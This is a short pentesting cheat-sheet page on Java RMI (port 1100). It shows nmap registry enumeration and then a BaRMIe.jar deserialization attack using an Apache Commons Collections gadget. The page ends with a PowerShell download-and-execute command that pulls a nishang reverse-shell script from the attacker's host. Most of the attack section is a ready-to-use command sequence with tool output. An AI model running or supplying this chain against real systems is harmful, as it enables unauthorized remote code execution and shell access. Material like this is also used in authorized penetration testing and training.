---
description: >-
  The Java Remote Method Invocation, or Java RMI, is a mechanism that allows an
  object that exists in one Java virtual machine to access and call methods that
  are contained in another one.
---

# PORT 1100/tcp - Java RMI

## Enumeration

We can enumerate RMI ports with nmap.

```text
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p <PORT> <IP>

<PORT>/tcp  open  java-rmi     Java RMI
| rmi-dumpregistry:
|   creamtec/ajaxswing/JVMFactory
|     com.creamtec.ajaxswing.core.JVMFactory_Stub
|     @127.0.0.1:49157
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
```

## BaRMIe.jar

If we can dump the registry of the java-rmi instance is the case where the machine may be vulnerable to a deserialization exploit. To exploit this deserialization on RMI ports I'm going to use BaRMIe.jar. We can download the file on the following link.

{% embed url="https://github.com/NickstaDB/BaRMIe/releases/download/v1.01/BaRMIe\_v1.01.jar" %}

You need to select some parameters such as **target**, **attack**, **payload** and **OS command**, here and example of usage with a nishang reverse shell. I used Apache Commons for payload but you can use one different.

```text
$ java -jar BaRMIe_v1.01.jar -attack <IP> <PORT>

Target summary:
  <IP>:<PORT>
    Available attacks:
      [---] Java RMI registry illegal bind deserialization

Target selection
 1) <IP>:<PORT> Reliability [---], Deser attack [Y], payload [?]
Select a target to attack (q to quit): 1

Available attacks for target: <IP>:<PORT>
 1) [---] Java RMI registry illegal bind deserialization
Select an attack to execute (b to back up, q to quit): 1

Attack: Java RMI registry illegal bind deserialization [---]

Deserialization payloads for: <IP>:<PORT>
 1) Apache Commons Collections 3.1, 3.2, 3.2.1
 2) Apache Commons Collections 4.0-alpha1, 4.0
 3) Apache Groovy 1.7-beta-1 to 2.4.0-beta-4
 4) Apache Groovy 2.4.0-rc1 to 2.4.3
 5) JBoss Interceptors API
 6) ROME 0.5 to 1.0
 7) ROME 1.5 to 1.7.3
 8) Mozilla Rhino 1.7r2
 9) Mozilla Rhino 1.7r2 for Java 1.4
 10) Mozilla Rhino 1.7r3
 11) Mozilla Rhino 1.7r3 for Java 1.4
 12) Mozilla Rhino 1.7r4 and 1.7r5
 13) Mozilla Rhino 1.7r6, 1.7r7, and 1.7.7.1
 a) Try all available deserialization payloads
Select a payload to use (b to back up, q to quit): 1


Enter an OS command to execute: powershell.exe -command "IEX(new-object net.webclient).downloadstring('http://<ip-kali>/Invoke-PowerShellTcp.ps1')"


```



